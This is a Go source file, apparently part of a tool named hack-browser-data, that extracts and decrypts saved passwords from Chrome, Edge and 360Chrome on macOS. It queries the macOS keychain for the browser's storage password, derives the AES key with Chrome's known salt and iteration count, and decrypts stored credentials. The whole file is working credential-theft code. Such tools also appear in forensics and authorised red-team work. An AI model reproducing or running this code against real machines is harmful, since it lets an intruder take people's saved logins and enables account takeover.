package utils

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"errors"
	"hack-browser-data/log"
	"os/exec"
	"strings"

	"golang.org/x/crypto/pbkdf2"
)

const (
	chromeDir    = "/Users/*/Library/Application Support/Google/Chrome/*/"
	edgeDir      = "/Users/*/Library/Application Support/Microsoft Edge/*/"
	mac360Secure = "/Users/*/Library/Application Support/360Chrome/*/"
)

const (
	Chrome        = "Chrome"
	Edge          = "Microsoft Edge"
	SecureBrowser = "Chromium"
)

var (
	iv          = []byte{32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32}
	command     = []string{"security", "find-generic-password", "-wa"}
	chromeSalt  = []byte("saltysalt")
	chromeKey   []byte
	browserList = map[string]struct {
		Dir     string
		Command string
	}{
		"chrome": {
			chromeDir,
			Chrome,
		},
		"edge": {
			edgeDir,
			Edge,
		},
	}
)

func DecryptStringWithDPAPI(data []byte) (string, error) {
	return string(data), nil
}

func PickBrowser(name string) (browserDir, command string, err error) {
	name = strings.ToLower(name)
	if choice, ok := browserList[name]; ok {
		return choice.Dir, choice.Command, err
	}
	return "", "", errBrowserNotSupported
}

func InitKey(key string) error {
	var (
		cmd            *exec.Cmd
		stdout, stderr bytes.Buffer
	)
	cmd = exec.Command(command[0], command[1], command[2], key)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		log.Println(err)
		return err
	}
	if stderr.Len() > 0 {
		err = errors.New(stderr.String())
		log.Println(err)
	}
	temp := stdout.Bytes()
	chromePass := temp[:len(temp)-1]
	decryptChromeKey(chromePass)
	return err
}

//func GetDBPath(dir string, dbName ...string) (dbFile []string) {
//	for _, v := range dbName {
//		s, err := filepath.Glob(dir + v)
//		if err != nil && len(s) == 0 {
//			continue
//		}
//		if len(s) > 0 {
//			log.Debugf("Find %s File Success", v)
//			log.Debugf("%s file location is %s", v, s[0])
//			dbFile = append(dbFile, s[0])
//		}
//	}
//	return dbFile
//}

func decryptChromeKey(chromePass []byte) {
	chromeKey = pbkdf2.Key(chromePass, chromeSalt, 1003, 16, sha1.New)
}

func DecryptChromePass(encryptPass []byte) (string, error) {
	if len(encryptPass) > 3 {
		return aes128CBCDecrypt(encryptPass[3:])
	} else {
		return "", &DecryptError{
			err: passwordIsEmpty,
		}
	}
}

func aes128CBCDecrypt(encryptPass []byte) (string, error) {
	if len(chromeKey) == 0 {
		return "", nil
	}
	block, err := aes.NewCipher(chromeKey)
	if err != nil {
		return "", err
	}
	dst := make([]byte, len(encryptPass))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(dst, encryptPass)
	dst = PKCS5UnPadding(dst)
	return string(dst), nil
}

func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpadding := int(src[length-1])
	return src[:(length - unpadding)]
}
